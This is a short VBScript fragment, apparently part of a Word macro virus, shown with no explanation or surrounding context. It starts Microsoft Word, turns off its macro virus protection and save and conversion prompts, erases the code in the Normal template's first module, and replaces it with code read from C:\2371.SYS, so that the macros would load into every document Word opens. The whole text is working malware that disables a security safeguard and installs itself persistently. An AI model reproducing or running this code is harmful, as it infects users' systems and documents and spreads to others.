Set N = WScript.CreateObject("Word.Application")
N.Options.VirusProtection = 0: N.Options.SaveNormalPrompt = 0: N.Options.ConfirmConversions = 0
For x = 1 To N.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
N.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
N.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\2371.SYS")
N.Application.Quit
